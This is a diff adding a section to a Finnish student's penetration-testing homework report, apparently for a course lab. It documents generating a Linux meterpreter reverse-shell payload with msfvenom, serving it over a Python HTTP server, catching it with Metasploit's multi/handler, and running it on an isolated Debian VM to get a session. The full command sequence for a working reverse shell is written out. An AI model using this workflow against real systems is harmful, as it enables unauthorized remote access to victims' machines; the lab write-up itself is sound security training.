@@ -260,7 +260,58 @@ Ja käyttäjän "kirottu" salasana on "password" loistavaa.
 
 ## g) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.
 
+Tässä meni oma tovinsa perehtymiseen. Tiivistelmä osion linkkien lukemisen lisäksi katsoin seuraavan youtube videon: (https://www.youtube.com/watch?v=ZqWfDrD2WVY) ja tutkailin Renne Jämsénin viimevuoden [raporttia](https://github.com/RenneJ/tunkeutumistestaus/blob/main/h4-marraskuu2024!.md).
 
+Aloitin sillä, että irroitin kali-koneen verkosta. Seuraavaksi muokkasin Karvisen vinkeistä löytyvää komentoa:
+
+    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=(HYÖKKÄÄJÄN IP-OSOITE) LPORT=5555 -f elf > haker.elf
+
+* Komennolla luotiin "haker.elf" reverse shell hyökkäys ohjelma. Eli, kun uhri suorittaa tämän, niin on hyökkääjällä yhteys/pääsy uhriin.
+
+Sitten seurasin youtube videon ohjeita enimmäkseen. Avasin serverin, josta uhri voi käydä hakemassa saastuneen tiedoston.
+
+    python3 -m http.server -b 192.168.69.4 8000
+
+* -b + Ip + port = määrittää serverin tähän osoitteeseen/porttiin (hyökkääjän osoite, täältä uhri hakee tiedoston)
+
+![e](images/h4_e3.png)
+
+Sitten käynnistin msfconsolen
+
+![e](images/h4_e1.png)
+
+Seuraavaksi valitsin exploitin ja tein vaadittavat säädöt:
+
+    use exploit/multi/handler
+    set payload linux/x64/meterpreter/reverse_tcp
+    set LHOST 192.168.69.4
+    set LPORT 5555
+    
+Ja käynnistin exploitin
+
+    exploit -j
+    
+![e](images/h4_e2.png)
+
+Eli nyt ollaan tilanteessa, kun uhri suorittaa haittaohjelman, niin yhteys pitäisi muodostua. Tässä vaiheessa avasin 5555 portin palomuurista, jotta sinne päästään käsiksi.
+
+Kirjauduin vanhalle debian virtuaalikoneelle mitä en ole toviin käyttänyt. Irtikytkin tämän verkosta. Ja wgetillä hain "haker.elf" tiedoston serveriltä.
+
+![e](images/h4_e4.png)
+
+Annoin kaikille suoritus oikeudet tiedostoon komennolla:
+
+    chmod ugo+x haker.elf
+
+Ja suoritin tämän:
+
+    ./haker.elf
+
+![e](images/h4_e5.png)
+
+![e](images/h4_e6.png)
+
+Sisällä ollaan onnistuneesti.
 
 ## Lähteet:
 
@@ -279,3 +330,7 @@ Stack Overflow 2015: Viestiketju, OpenSSL headers missing when building OpenSSH.
 Ask Ubuntu 2017: How do I password protect a pdf document?. Luettavissa: (https://askubuntu.com/questions/938015/how-do-i-password-protect-a-pdf-document) Luettu 23.4.2025
 
 L. Reynolds 2024: Password cracking with John the Ripper on Linux. Luettavissa: (https://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux) Luettu 23.4.2025
+
+CyberOffense 2022: Use Msfvenom to Create a Reverse TCP Payload. Katsottavissa: (https://www.youtube.com/watch?v=ZqWfDrD2WVY) Katsottu. 23.4.2025
+
+R. Jämsén 2024: H4 Marraskuu2024! (Karvinen 2024). Luettavissa (https://github.com/RenneJ/tunkeutumistestaus/blob/main/h4-marraskuu2024!.md) Luettu. 23.4.2025
